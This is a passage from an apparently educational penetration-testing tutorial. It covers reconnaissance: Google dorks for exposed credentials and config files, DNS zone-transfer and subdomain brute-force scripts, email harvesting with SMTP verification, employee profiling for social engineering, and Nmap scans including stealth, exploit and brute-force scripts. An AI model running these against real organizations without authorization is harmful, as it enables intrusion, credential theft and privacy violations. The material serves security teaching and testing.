---
title: "Cybersecurity Mastery - Part 2: Offensive Security & Ethical Hacking"
date: 2026-01-27 00:00:00 +0530
categories: [Cybersecurity, Cybersecurity Mastery]
tags: [Cybersecurity, Ethical-hacking, Penetration-testing, OSINT, Exploitation, Web-security, Active-Directory, Red-team]
description: "Penetration testing methodology, OSINT and reconnaissance, exploitation, web, wireless and Active Directory attacks, privilege escalation and red teaming."
---

{% raw %}

# Complete Cybersecurity & Data Forensics Mastery Part 2: Offensive Security & Ethical Hacking

## Introduction

Welcome to Part 2 of our Cybersecurity & Data Forensics Mastery series. In Part 1, we established foundational security principles and SDLC integration. Now, we shift our focus to the offensive side of cybersecurity—understanding how attackers think, operate, and exploit vulnerabilities.

**Why Study Offensive Security?**

Understanding offensive techniques is essential for effective defense. By learning how systems are compromised, you can:
- Identify vulnerabilities before attackers do
- Design more resilient security architectures
- Conduct effective security testing
- Respond to incidents with attacker-level knowledge
- Validate security controls through realistic testing

**Ethical and Legal Foundation:**

> **⚠️ CRITICAL LEGAL WARNING:** All techniques in this guide are for **authorized security testing only**. Unauthorized access to computer systems is illegal under laws including the Computer Fraud and Abuse Act (CFAA) in the US, Computer Misuse Act in the UK, and similar legislation worldwide. Always obtain explicit written authorization before conducting any security testing.

**What You'll Learn in Part 2:**

- Reconnaissance and OSINT techniques for information gathering
- Network scanning and enumeration methodologies
- Vulnerability assessment and exploitation frameworks
- Web application penetration testing (OWASP Top 10)
- Wireless network security testing
- Mobile application security assessment
- Social engineering tactics and defenses
- Password attacks and credential compromise
- Active Directory exploitation techniques
- Post-exploitation and persistence mechanisms
- Privilege escalation (Windows and Linux)
- Lateral movement and pivoting
- Command & Control (C2) frameworks

**Prerequisites:**

- Completion of Part 1 or equivalent knowledge
- Understanding of networking protocols (TCP/IP, HTTP, DNS)
- Familiarity with Linux and Windows command line
- Basic scripting ability (Python, Bash, or PowerShell)
- Access to a lab environment for practice

**Lab Environment Setup:**

Before beginning practical exercises, set up a safe, isolated lab:

```bash
# Recommended lab setup components:
1. Hypervisor: VirtualBox or VMware Workstation
2. Attacking machine: Kali Linux (https://www.kali.org/)
3. Target machines:
   - Metasploitable 2 (Linux)
   - Metasploitable 3 (Windows/Linux)
   - DVWA (Damn Vulnerable Web Application)
   - WebGoat (OWASP training app)
   - HackTheBox or TryHackMe subscription (optional)

# Network isolation
- Create NAT or host-only network
- NO bridged networking to production systems
- Disable any potential attack vectors to your host system
```

Let's begin our journey into offensive security.

---

## 2.1 Reconnaissance & OSINT

Reconnaissance is the first phase of any penetration test or security assessment. The goal is to gather as much information as possible about the target without alerting defenses. Good reconnaissance makes exploitation easier and more targeted.

### The Cyber Kill Chain

Understanding where reconnaissance fits in the attack lifecycle:

```
1. Reconnaissance    ← We are here
2. Weaponization
3. Delivery
4. Exploitation
5. Installation
6. Command & Control
7. Actions on Objectives
```

### Passive Reconnaissance

Passive reconnaissance gathers information without directly interacting with the target's systems. This minimizes detection risk.

#### Search Engine Dorking (Google Hacking)

Google and other search engines index vast amounts of information, including sensitive data that shouldn't be public.

**Google Dork Operators:**

```
# Basic operators
site:        Search within specific domain
filetype:    Find specific file types
intitle:     Text in page title
inurl:       Text in URL
intext:      Text in page body
cache:       Google's cached version
link:        Pages linking to URL
related:     Similar pages

# Advanced combinations
-            Exclude terms
"quotes"     Exact phrase
OR           Either term
*            Wildcard
..           Number range
```

**Practical Google Dorking Examples:**

```bash
# Find exposed login pages
site:example.com inurl:admin
site:example.com inurl:login
site:example.com intitle:"index of" "admin"

# Find configuration files
site:example.com filetype:env
site:example.com filetype:config
site:example.com ext:xml inurl:config

# Find database backups
site:example.com filetype:sql
site:example.com filetype:db
site:example.com inurl:backup intitle:index.of

# Find exposed documents
site:example.com filetype:pdf confidential
site:example.com filetype:xlsx
site:example.com filetype:docx

# Find error messages revealing info
site:example.com intext:"sql syntax near"
site:example.com intext:"mysql_fetch_array()"
site:example.com intext:"Warning: mysql_"

# Find directory listings
site:example.com intitle:"index of" "parent directory"
site:example.com intitle:"index of" ".git"

# Find vulnerable software versions
inurl:phpMyAdmin "Welcome to phpMyAdmin"
"Apache/2.4.49" intitle:"Index of /"
"Server: Microsoft-IIS/7.5"

# Find exposed cameras/IoT
intitle:"webcamXP 5"
inurl:":8080" intitle:"Blue Iris"
inurl:/view.shtml

# Find API keys and credentials
site:github.com "AWS_ACCESS_KEY_ID"
site:pastebin.com "api_key"
filetype:env "DB_PASSWORD"
```

**Automated Google Dorking Tools:**

```python
#!/usr/bin/env python3
"""
Google Dorking Automation Script
"""
import requests
from bs4 import BeautifulSoup
from urllib.parse import quote
import time

class GoogleDorker:
    def __init__(self):
        self.base_url = "https://www.google.com/search"
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    
    def search(self, query, num_results=10):
        """
        Perform Google search with dork
        """
        results = []
        
        params = {
            'q': query,
            'num': num_results
        }
        
        try:
            response = requests.get(
                self.base_url,
                params=params,
                headers=self.headers,
                timeout=10
            )
            
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Extract search results
                for result in soup.find_all('div', class_='g'):
                    link_tag = result.find('a')
                    if link_tag and 'href' in link_tag.attrs:
                        url = link_tag['href']
                        title_tag = result.find('h3')
                        title = title_tag.text if title_tag else 'No title'
                        
                        results.append({
                            'title': title,
                            'url': url
                        })
            
            return results
            
        except Exception as e:
            print(f"Error searching: {e}")
            return []
    
    def search_exposed_files(self, domain, file_types):
        """
        Search for exposed files of specific types
        """
        findings = {}
        
        for ftype in file_types:
            query = f"site:{domain} filetype:{ftype}"
            print(f"Searching: {query}")
            
            results = self.search(query)
            if results:
                findings[ftype] = results
            
            # Rate limiting to avoid blocks
            time.sleep(2)
        
        return findings
    
    def search_subdomains(self, domain):
        """
        Find subdomains using Google
        """
        query = f"site:*.{domain}"
        return self.search(query, num_results=50)
    
    def search_technologies(self, domain):
        """
        Identify technologies used
        """
        queries = {
            'wordpress': f'site:{domain} inurl:wp-content',
            'drupal': f'site:{domain} inurl:drupal',
            'joomla': f'site:{domain} inurl:joomla',
            'phpMyAdmin': f'site:{domain} inurl:phpMyAdmin',
            'admin_panels': f'site:{domain} inurl:admin',
        }
        
        findings = {}
        for tech, query in queries.items():
            results = self.search(query)
            if results:
                findings[tech] = len(results)
            time.sleep(2)
        
        return findings

# Example usage
if __name__ == "__main__":
    dorker = GoogleDorker()
    
    target_domain = "example.com"
    
    print(f"[*] Google Dorking Target: {target_domain}\n")
    
    # Search for exposed files
    print("[*] Searching for exposed files...")
    file_types = ['pdf', 'xlsx', 'docx', 'sql', 'env', 'config']
    exposed_files = dorker.search_exposed_files(target_domain, file_types)
    
    for ftype, results in exposed_files.items():
        print(f"\n[+] Found {len(results)} .{ftype} files:")
        for result in results[:5]:  # Show first 5
            print(f"    - {result['title']}")
            print(f"      {result['url']}")
    
    # Search for subdomains
    print("\n[*] Searching for subdomains...")
    subdomains = dorker.search_subdomains(target_domain)
    print(f"[+] Found {len(subdomains)} potential subdomains")
    
    # Identify technologies
    print("\n[*] Identifying technologies...")
    technologies = dorker.search_technologies(target_domain)
    for tech, count in technologies.items():
        if count > 0:
            print(f"[+] {tech}: {count} results")
```

**Defense Against Google Dorking:**

```markdown
## Preventing Information Leakage via Search Engines

1. **robots.txt Configuration**
   - Block sensitive directories
   - Use with caution (reveals structure)

2. **Meta Tags**
   ```html
   <meta name="robots" content="noindex, nofollow">
   ```

3. **Google Search Console**
   - Request removal of sensitive content
   - Monitor indexed pages

4. **Server Configuration**
   - Disable directory listing
   - Implement authentication on admin panels
   - Move sensitive files outside web root

5. **Regular Monitoring**
   - Search for: site:yourdomain.com
   - Look for unexpected indexed content
   - Set up Google Alerts for sensitive terms
```

#### WHOIS and DNS Enumeration

WHOIS provides registration information about domains and IP addresses.

```bash
# Basic WHOIS lookup
whois example.com

# WHOIS for IP address
whois 93.184.216.34

# Extract registrar info, name servers, registration dates
whois example.com | grep -i "registrar\|name server\|creation date"

# Reverse WHOIS (find other domains by same registrant)
# Use services like:
# - ViewDNS.info
# - WhoisXMLAPI
# - DomainTools
```

**DNS Enumeration:**

```bash
# DNS lookup tools
dig example.com
nslookup example.com
host example.com

# Get all DNS records
dig example.com ANY

# Specific record types
dig example.com A      # IPv4 address
dig example.com AAAA   # IPv6 address
dig example.com MX     # Mail servers
dig example.com NS     # Name servers
dig example.com TXT    # Text records (SPF, DMARC, verification)
dig example.com SOA    # Start of authority

# DNS zone transfer attempt (rarely works now)
dig @ns1.example.com example.com AXFR

# Find mail servers
dig example.com MX +short

# Trace DNS resolution path
dig +trace example.com

# Use specific DNS server
dig @8.8.8.8 example.com
```

**Automated DNS Enumeration:**

```python
#!/usr/bin/env python3
"""
DNS Enumeration Script
"""
import dns.resolver
import dns.zone
import dns.query
from dns.exception import DNSException

class DNSEnumerator:
    def __init__(self, domain):
        self.domain = domain
        self.resolver = dns.resolver.Resolver()
        # Use Google's DNS for reliability
        self.resolver.nameservers = ['8.8.8.8', '8.8.4.4']
    
    def get_record(self, record_type):
        """
        Get specific DNS record type
        """
        try:
            answers = self.resolver.resolve(self.domain, record_type)
            return [str(rdata) for rdata in answers]
        except DNSException as e:
            return []
    
    def get_all_records(self):
        """
        Get common DNS records
        """
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']
        records = {}
        
        for rtype in record_types:
            results = self.get_record(rtype)
            if results:
                records[rtype] = results
        
        return records
    
    def attempt_zone_transfer(self):
        """
        Attempt DNS zone transfer (AXFR)
        """
        # Get name servers
        try:
            ns_records = self.resolver.resolve(self.domain, 'NS')
        except DNSException:
            return None
        
        for ns in ns_records:
            ns_host = str(ns).rstrip('.')
            print(f"[*] Attempting zone transfer from {ns_host}")
            
            try:
                zone = dns.zone.from_xfr(
                    dns.query.xfr(ns_host, self.domain)
                )
                
                print(f"[+] Zone transfer successful from {ns_host}!")
                return zone
                
            except Exception as e:
                print(f"[-] Zone transfer failed: {e}")
        
        return None
    
    def find_subdomains_bruteforce(self, wordlist):
        """
        Brute force subdomain discovery
        """
        found_subdomains = []
        
        with open(wordlist, 'r') as f:
            for line in f:
                subdomain = line.strip()
                full_domain = f"{subdomain}.{self.domain}"
                
                try:
                    answers = self.resolver.resolve(full_domain, 'A')
                    ip = answers[0].address
                    found_subdomains.append((full_domain, ip))
                    print(f"[+] Found: {full_domain} -> {ip}")
                    
                except DNSException:
                    pass  # Subdomain doesn't exist
        
        return found_subdomains
    
    def reverse_dns_lookup(self, ip_address):
        """
        Reverse DNS lookup (PTR record)
        """
        try:
            reverse_name = dns.reversename.from_address(ip_address)
            answers = self.resolver.resolve(reverse_name, 'PTR')
            return [str(rdata) for rdata in answers]
        except DNSException:
            return []

# Example usage
if __name__ == "__main__":
    target = "example.com"
    
    print(f"[*] DNS Enumeration for: {target}\n")
    
    enumerator = DNSEnumerator(target)
    
    # Get all common records
    print("[*] Retrieving DNS records...")
    records = enumerator.get_all_records()
    
    for record_type, values in records.items():
        print(f"\n[+] {record_type} Records:")
        for value in values:
            print(f"    {value}")
    
    # Attempt zone transfer
    print("\n[*] Attempting zone transfer...")
    zone = enumerator.attempt_zone_transfer()
    
    if zone:
        print("\n[+] Zone transfer results:")
        for name, node in zone.nodes.items():
            print(f"    {name}")
    else:
        print("[-] Zone transfer not possible")
    
    # Subdomain brute force (with small wordlist)
    print("\n[*] Brute forcing subdomains...")
    # Create small test wordlist
    test_subdomains = ['www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'staging']
    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
        f.write('\n'.join(test_subdomains))
        wordlist_path = f.name
    
    found = enumerator.find_subdomains_bruteforce(wordlist_path)
    print(f"\n[+] Found {len(found)} subdomains")
```

#### Email Harvesting

Collecting email addresses associated with a target organization.

```bash
# Using theHarvester
theharvester -d example.com -b google
theharvester -d example.com -b bing
theharvester -d example.com -b linkedin
theharvester -d example.com -b all

# Options
# -d: domain
# -b: data source (google, bing, linkedin, etc.)
# -l: limit results
# -f: save to file

# Using hunter.io (requires API key)
curl "https://api.hunter.io/v2/domain-search?domain=example.com&api_key=YOUR_API_KEY"

# Using phonebook.cz (no API key needed)
curl "https://phonebook.cz/search?q=example.com"
```

**Email Harvesting Script:**

```python
#!/usr/bin/env python3
"""
Email Harvesting Tool
"""
import requests
import re
from bs4 import BeautifulSoup

class EmailHarvester:
    def __init__(self, domain):
        self.domain = domain
        self.emails = set()
        self.email_pattern = re.compile(
            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        )
    
    def extract_emails_from_text(self, text):
        """
        Extract email addresses from text
        """
        found = self.email_pattern.findall(text)
        # Filter to target domain
        target_emails = [
            email for email in found
            if self.domain in email.lower()
        ]
        self.emails.update(target_emails)
        return target_emails
    
    def harvest_from_website(self, url):
        """
        Crawl website and extract emails
        """
        try:
            response = requests.get(url, timeout=10)
            
            # Extract from HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            
            found = self.extract_emails_from_text(text)
            
            # Also check mailto: links
            mailto_links = soup.find_all('a', href=re.compile(r'^mailto:'))
            for link in mailto_links:
                email = link['href'].replace('mailto:', '').split('?')[0]
                if self.domain in email.lower():
                    self.emails.add(email)
                    found.append(email)
            
            return found
            
        except Exception as e:
            print(f"Error harvesting from {url}: {e}")
            return []
    
    def harvest_from_search_engine(self, engine='google', num_pages=5):
        """
        Harvest emails using search engine results
        """
        # Note: In practice, use APIs or tools like theHarvester
        # This is simplified example
        
        query = f'site:{self.domain} "@{self.domain}"'
        
        # Perform searches (implementation depends on search engine API)
        # For production, use:
        # - theHarvester
        # - hunter.io API
        # - Custom search engine API
        
        pass
    
    def harvest_from_github(self):
        """
        Search GitHub for emails
        """
        try:
            # Search GitHub for commits with email
            query = f'{self.domain} in:email'
            
            # Use GitHub API (requires authentication)
            # This is simplified; real implementation needs GitHub token
            
            headers = {
                'Accept': 'application/vnd.github.v3+json'
            }
            
            url = f'https://api.github.com/search/commits?q={query}'
            
            # Would need to parse results
            
        except Exception as e:
            print(f"Error searching GitHub: {e}")
    
    def generate_email_variations(self, first_name, last_name):
        """
        Generate common email format variations
        """
        variations = [
            f"{first_name}.{last_name}@{self.domain}",
            f"{first_name}{last_name}@{self.domain}",
            f"{first_name[0]}{last_name}@{self.domain}",
            f"{last_name}.{first_name}@{self.domain}",
            f"{first_name}@{self.domain}",
            f"{last_name}@{self.domain}",
            f"{first_name}_{last_name}@{self.domain}",
        ]
        return variations
    
    def verify_email(self, email):
        """
        Verify if email exists (SMTP verification)
        Note: Many servers block this now
        """
        import smtplib
        import dns.resolver
        
        try:
            # Get MX records
            domain = email.split('@')[1]
            mx_records = dns.resolver.resolve(domain, 'MX')
            mx_host = str(mx_records[0].exchange)
            
            # Connect to SMTP server
            server = smtplib.SMTP(timeout=10)
            server.connect(mx_host)
            server.helo(server.local_hostname)
            server.mail('test@example.com')
            code, message = server.rcpt(email)
            server.quit()
            
            # 250 = success, email exists
            return code == 250
            
        except Exception:
            return None  # Unable to verify

# Example usage
if __name__ == "__main__":
    target_domain = "example.com"
    
    harvester = EmailHarvester(target_domain)
    
    # Harvest from website
    print(f"[*] Harvesting emails from {target_domain}")
    found = harvester.harvest_from_website(f"https://{target_domain}")
    
    print(f"\n[+] Found {len(found)} emails:")
    for email in found:
        print(f"    {email}")
    
    # Generate variations for known employee
    print("\n[*] Generating email variations for 'John Doe':")
    variations = harvester.generate_email_variations("john", "doe")
    for email in variations:
        print(f"    {email}")
```

#### Metadata Extraction

Metadata in documents can reveal sensitive information about the organization.

```bash
# Using ExifTool
exiftool document.pdf
exiftool image.jpg
exiftool *.docx

# Extract specific fields
exiftool -Author -CreateDate -Software document.pdf

# Using FOCA (Windows tool)
# - Download from: https://github.com/ElevenPaths/FOCA
# - GUI tool for metadata extraction
# - Automatically downloads files and extracts metadata

# Using metagoofil
metagoofil -d example.com -t pdf,doc,xls,ppt -l 200 -n 50 -o example_output
# -d: domain
# -t: file types
# -l: search results limit
# -n: download limit
# -o: output directory
```

**Metadata Extraction Script:**

```python
#!/usr/bin/env python3
"""
Metadata Extraction Tool
"""
from PyPDF2 import PdfReader
from docx import Document
import subprocess
import os

class MetadataExtractor:
    def __init__(self):
        self.metadata = {}
    
    def extract_pdf_metadata(self, pdf_path):
        """
        Extract metadata from PDF file
        """
        try:
            reader = PdfReader(pdf_path)
            metadata = reader.metadata
            
            info = {
                'filename': os.path.basename(pdf_path),
                'author': metadata.get('/Author', 'Unknown'),
                'creator': metadata.get('/Creator', 'Unknown'),
                'producer': metadata.get('/Producer', 'Unknown'),
                'subject': metadata.get('/Subject', 'Unknown'),
                'title': metadata.get('/Title', 'Unknown'),
                'creation_date': metadata.get('/CreationDate', 'Unknown'),
                'modification_date': metadata.get('/ModDate', 'Unknown'),
            }
            
            return info
            
        except Exception as e:
            print(f"Error extracting PDF metadata: {e}")
            return None
    
    def extract_docx_metadata(self, docx_path):
        """
        Extract metadata from DOCX file
        """
        try:
            doc = Document(docx_path)
            core_props = doc.core_properties
            
            info = {
                'filename': os.path.basename(docx_path),
                'author': core_props.author or 'Unknown',
                'created': str(core_props.created) if core_props.created else 'Unknown',
                'modified': str(core_props.modified) if core_props.modified else 'Unknown',
                'last_modified_by': core_props.last_modified_by or 'Unknown',
                'title': core_props.title or 'Unknown',
                'subject': core_props.subject or 'Unknown',
            }
            
            return info
            
        except Exception as e:
            print(f"Error extracting DOCX metadata: {e}")
            return None
    
    def extract_exif_metadata(self, image_path):
        """
        Extract EXIF metadata from image
        Requires exiftool installed
        """
        try:
            result = subprocess.run(
                ['exiftool', '-json', image_path],
                capture_output=True,
                text=True
            )
            
            if result.returncode == 0:
                import json
                metadata = json.loads(result.stdout)[0]
                
                # Extract relevant fields
                info = {
                    'filename': os.path.basename(image_path),
                    'camera_make': metadata.get('Make', 'Unknown'),
                    'camera_model': metadata.get('Model', 'Unknown'),
                    'software': metadata.get('Software', 'Unknown'),
                    'date_time': metadata.get('DateTimeOriginal', 'Unknown'),
                    'gps_latitude': metadata.get('GPSLatitude', 'Not available'),
                    'gps_longitude': metadata.get('GPSLongitude', 'Not available'),
                }
                
                return info
            
        except Exception as e:
            print(f"Error extracting EXIF metadata: {e}")
            return None
    
    def analyze_metadata(self, metadata_list):
        """
        Analyze extracted metadata for patterns
        """
        analysis = {
            'authors': set(),
            'software': set(),
            'usernames': set(),
            'paths': set()
        }
        
        for metadata in metadata_list:
            if 'author' in metadata:
                analysis['authors'].add(metadata['author'])
            
            if 'creator' in metadata or 'software' in metadata:
                software = metadata.get('creator') or metadata.get('software')
                if software != 'Unknown':
                    analysis['software'].add(software)
            
            # Extract potential usernames from paths
            for key, value in metadata.items():
                if 'Users' in str(value) or 'home' in str(value):
                    analysis['paths'].add(str(value))
        
        return analysis

# Example usage
if __name__ == "__main__":
    extractor = MetadataExtractor()
    
    # Example files (replace with actual files)
    test_files = [
        'document.pdf',
        'presentation.pptx',
        'photo.jpg'
    ]
    
    all_metadata = []
    
    for filepath in test_files:
        if not os.path.exists(filepath):
            continue
        
        print(f"[*] Extracting metadata from: {filepath}")
        
        if filepath.endswith('.pdf'):
            metadata = extractor.extract_pdf_metadata(filepath)
        elif filepath.endswith('.docx'):
            metadata = extractor.extract_docx_metadata(filepath)
        elif filepath.lower().endswith(('.jpg', '.jpeg', '.png')):
            metadata = extractor.extract_exif_metadata(filepath)
        else:
            continue
        
        if metadata:
            all_metadata.append(metadata)
            print(f"[+] Author: {metadata.get('author', 'N/A')}")
            print(f"[+] Created: {metadata.get('created', metadata.get('creation_date', 'N/A'))}")
            print()
    
    # Analyze patterns
    if all_metadata:
        print("[*] Analyzing metadata patterns...")
        analysis = extractor.analyze_metadata(all_metadata)
        
        print(f"\n[+] Unique authors found: {len(analysis['authors'])}")
        for author in analysis['authors']:
            print(f"    - {author}")
        
        print(f"\n[+] Software/Applications used: {len(analysis['software'])}")
        for software in analysis['software']:
            print(f"    - {software}")
```

#### Social Media Intelligence (SOCMINT)

Social media platforms contain vast amounts of information about organizations and individuals.

**LinkedIn Reconnaissance:**

```markdown
## LinkedIn Intelligence Gathering

### Company Information:
- Navigate to company page
- Note employee count and growth
- Review job postings (technologies, skills required)
- Identify key personnel (C-suite, security team)
- Map organizational structure

### Employee Information:
- Search: "site:linkedin.com/in example.com"
- Note job titles and responsibilities
- Identify potential targets for social engineering
- Find email format patterns from public profiles
- Check for oversharing (conference attendance, projects)

### Automated Tools:
- linkedin2username (GitHub)
  ```bash
  python linkedin2username.py -c "Example Company"
  ```
- CrossLinked (GitHub)
  ```bash
  python3 crosslinked.py -f '{first}.{last}@example.com' "Example Company"
  ```
```

**Twitter (X) OSINT:**

```bash
# Search operators
from:username              # Tweets from user
to:username                # Tweets to user
@username                  # Mentions
#hashtag                   # Hashtags
"exact phrase"             # Exact match
since:2024-01-01           # Date range
until:2024-12-31
geocode:lat,long,radius    # Location
filter:media               # With media
filter:links               # With links

# Example searches
"example.com" filter:links
#cybersecurity "example company"
from:examplecorp "product launch"
```

**GitHub Reconnaissance:**

```bash
# Search for exposed secrets
org:examplecompany password
org:examplecompany api_key
org:examplecompany secret
org:examplecompany token
filename:.env "DB_PASSWORD"
extension:pem private
extension:ppk private

# Find internal tools/repositories
org:examplecompany
user:employee_username

# Review commits for emails and patterns
# Look for hardcoded credentials
# Identify technologies and frameworks used
```

**Automated SOCMINT Tool:**

```python
#!/usr/bin/env python3
"""
Social Media Intelligence Gathering
"""
import tweepy
import requests

class SocialMediaIntelligence:
    def __init__(self):
        pass
    
    def search_twitter(self, query, api_key, api_secret):
        """
        Search Twitter for mentions
        """
        try:
            # Initialize Tweepy
            auth = tweepy.OAuthHandler(api_key, api_secret)
            api = tweepy.API(auth)
            
            tweets = api.search_tweets(q=query, count=100)
            
            results = []
            for tweet in tweets:
                results.append({
                    'user': tweet.user.screen_name,
                    'text': tweet.text,
                    'created_at': tweet.created_at,
                    'retweets': tweet.retweet_count,
                    'likes': tweet.favorite_count
                })
            
            return results
            
        except Exception as e:
            print(f"Twitter search error: {e}")
            return []
    
    def search_github_repos(self, organization):
        """
        Search GitHub for organization repositories
        """
        try:
            url = f"https://api.github.com/orgs/{organization}/repos"
            response = requests.get(url)
            
            if response.status_code == 200:
                repos = response.json()
                
                results = []
                for repo in repos:
                    results.append({
                        'name': repo['name'],
                        'description': repo['description'],
                        'language': repo['language'],
                        'stars': repo['stargazers_count'],
                        'forks': repo['forks_count'],
                        'url': repo['html_url']
                    })
                
                return results
            
        except Exception as e:
            print(f"GitHub search error: {e}")
            return []
    
    def search_github_code(self, query, organization=None):
        """
        Search GitHub code for secrets/credentials
        """
        try:
            if organization:
                query += f" org:{organization}"
            
            url = f"https://api.github.com/search/code?q={query}"
            response = requests.get(url)
            
            if response.status_code == 200:
                items = response.json().get('items', [])
                
                results = []
                for item in items:
                    results.append({
                        'name': item['name'],
                        'path': item['path'],
                        'repository': item['repository']['full_name'],
                        'url': item['html_url']
                    })
                
                return results
            
        except Exception as e:
            print(f"GitHub code search error: {e}")
            return []

# Example usage
if __name__ == "__main__":
    socmint = SocialMediaIntelligence()
    
    target_org = "examplecompany"
    
    print(f"[*] Social Media Intelligence for: {target_org}\n")
    
    # Search GitHub repositories
    print("[*] Searching GitHub repositories...")
    repos = socmint.search_github_repos(target_org)
    
    print(f"[+] Found {len(repos)} repositories:")
    for repo in repos[:5]:  # Show first 5
        print(f"    {repo['name']} ({repo['language']})")
        print(f"    {repo['description']}")
        print(f"    Stars: {repo['stars']}, Forks: {repo['forks']}")
        print()
    
    # Search for potential secrets
    print("[*] Searching for potential exposed secrets...")
    secret_keywords = ['password', 'api_key', 'secret', 'token']
    
    for keyword in secret_keywords:
        results = socmint.search_github_code(keyword, target_org)
        if results:
            print(f"\n[!] Found potential {keyword} exposures:")
            for result in results[:3]:
                print(f"    {result['repository']}/{result['path']}")
```

### Active Reconnaissance

Active reconnaissance involves directly interacting with the target's systems. This has a higher risk of detection.

#### Network Scanning with Nmap

Nmap is the industry-standard network scanner.

**Basic Nmap Scans:**

```bash
# Ping sweep (discover live hosts)
nmap -sn 192.168.1.0/24

# Basic port scan
nmap 192.168.1.100

# Scan specific ports
nmap -p 80,443,22,21 192.168.1.100

# Scan port range
nmap -p 1-1000 192.168.1.100

# Scan all ports
nmap -p- 192.168.1.100

# Fast scan (most common 100 ports)
nmap -F 192.168.1.100

# Scan with service version detection
nmap -sV 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Aggressive scan (OS, version, script, traceroute)
nmap -A 192.168.1.100
```

**Nmap Scan Types:**

```bash
# TCP SYN scan (default, stealth)
nmap -sS 192.168.1.100

# TCP Connect scan (non-root)
nmap -sT 192.168.1.100

# UDP scan
nmap -sU 192.168.1.100

# Combined TCP and UDP
nmap -sS -sU -p T:80,443,U:53,161 192.168.1.100

# ACK scan (firewall detection)
nmap -sA 192.168.1.100

# Window scan
nmap -sW 192.168.1.100

# Null scan (stealthy)
nmap -sN 192.168.1.100

# FIN scan (stealthy)
nmap -sF 192.168.1.100

# Xmas scan (stealthy)
nmap -sX 192.168.1.100
```

**Nmap Timing and Performance:**

```bash
# Timing templates (0-5)
nmap -T0 192.168.1.100  # Paranoid (very slow, IDS evasion)
nmap -T1 192.168.1.100  # Sneaky (slow, IDS evasion)
nmap -T2 192.168.1.100  # Polite (slower, less bandwidth)
nmap -T3 192.168.1.100  # Normal (default)
nmap -T4 192.168.1.100  # Aggressive (fast, assumes good network)
nmap -T5 192.168.1.100  # Insane (very fast, may miss info)

# Parallel host scanning
nmap --min-hostgroup 50 192.168.1.0/24

# Parallel port scanning
nmap --min-parallelism 100 192.168.1.100

# Adjust timing
nmap --scan-delay 1s 192.168.1.100
nmap --max-rate 100 192.168.1.100
```

**Nmap Scripting Engine (NSE):**

```bash
# Default safe scripts
nmap -sC 192.168.1.100

# Specific script category
nmap --script=vuln 192.168.1.100
nmap --script=exploit 192.168.1.100
nmap --script=discovery 192.168.1.100
nmap --script=auth 192.168.1.100

# Specific script
nmap --script=http-enum 192.168.1.100
nmap --script=smb-enum-shares 192.168.1.100
nmap --script=ssl-cert 192.168.1.100

# Multiple scripts
nmap --script="http-*" 192.168.1.100

# Script with arguments
nmap --script=http-enum --script-args http-enum.basepath=/api/ 192.168.1.100

# List available scripts
nmap --script-help=all
nmap --script-help=http-*
```

**Practical Nmap Examples:**

```bash
# Web server enumeration
nmap -p 80,443 --script=http-enum,http-headers,http-methods,http-robots.txt 192.168.1.100

# SMB enumeration
nmap -p 445 --script=smb-enum-shares,smb-enum-users,smb-os-discovery 192.168.1.100

# Database scanning
nmap -p 3306 --script=mysql-enum 192.168.1.100
nmap -p 5432 --script=pgsql-brute 192.168.1.100
nmap -p 1433 --script=ms-sql-info 192.168.1.100

# Vulnerability scanning
nmap --script=vuln 192.168.1.100
nmap --script=vulscan 192.168.1.100

# SSL/TLS analysis
nmap -p 443 --script=ssl-enum-ciphers,ssl-cert,ssl-date 192.168.1.100

# DNS enumeration
nmap -p 53 --script=dns-zone-transfer,dns-recursion 192.168.1.100
```

**Nmap Output Formats:**

```bash
# Normal output (stdout)
nmap 192.168.1.100

# Save all formats
nmap -oA scan_results 192.168.1.100
# Creates: scan_results.nmap, scan_results.xml, scan_results.gnmap

# Save normal format
nmap -oN scan_results.txt 192.168.1.100

# Save XML format
nmap -oX scan_results.xml 192.168.1.100

# Save grepable format
nmap -oG scan_results.gnmap 192.168.1.100

# Append to existing file
nmap --append-output -oN scan_results.txt 192.168.1.100
```

**Automated Nmap Scanning Script:**

```python
#!/usr/bin/env python3
"""
Automated Nmap Scanning with python-nmap
"""
import nmap
import json

class NmapScanner:
    def __init__(self):
        self.nm = nmap.PortScanner()
    
    def quick_scan(self, target):
        """
        Quick scan of most common ports
        """
        print(f"[*] Quick scanning {target}...")
        
        self.nm.scan(
            target,
            arguments='-F -sV -T4'  # Fast scan, version detection
        )
        
        return self.parse_results()
    
    def full_scan(self, target):
        """
        Comprehensive scan of all ports
        """
        print(f"[*] Full scanning {target} (this may take a while)...")
        
        self.nm.scan(
            target,
            arguments='-p- -sV -sC -A -T4'
        )
        
        return self.parse_results()
    
    def vuln_scan(self, target):
        """
        Vulnerability scanning
        """
        print(f"[*] Vulnerability scanning {target}...")
        
        self.nm.scan(
            target,
            arguments='--script=vuln -sV'
        )
        
        return self.parse_results()
    
    def parse_results(self):
        """
        Parse Nmap scan results
        """
        results = {}
        
        for host in self.nm.all_hosts():
            results[host] = {
                'hostname': self.nm[host].hostname(),
                'state': self.nm[host].state(),
                'protocols': {}
            }
            
            for proto in self.nm[host].all_protocols():
                results[host]['protocols'][proto] = {}
                
                ports = self.nm[host][proto].keys()
                for port in ports:
                    port_info = self.nm[host][proto][port]
                    results[host]['protocols'][proto][port] = {
                        'state': port_info['state'],
                        'service': port_info['name'],
                        'product': port_info.get('product', ''),
                        'version': port_info.get('version', ''),
                        'extrainfo': port_info.get('extrainfo', '')
                    }
        
        return results
    
    def print_results(self, results):
        """
        Pretty print scan results
        """
        for host, data in results.items():
            print(f"\n[+] Host: {host} ({data['hostname']})")
            print(f"    State: {data['state']}")
            
            for proto, ports in data['protocols'].items():
                print(f"\n    Protocol: {proto}")
                for port, info in ports.items():
                    print(f"      Port {port}:")
                    print(f"        State: {info['state']}")
                    print(f"        Service: {info['service']}")
                    if info['product']:
                        print(f"        Product: {info['product']} {info['version']}")

# Example usage
if __name__ == "__main__":
    scanner = NmapScanner()
    
    target = "192.168.1.100"
    
    # Quick scan
    results = scanner.quick_scan(target)
    scanner.print_results(results)
    
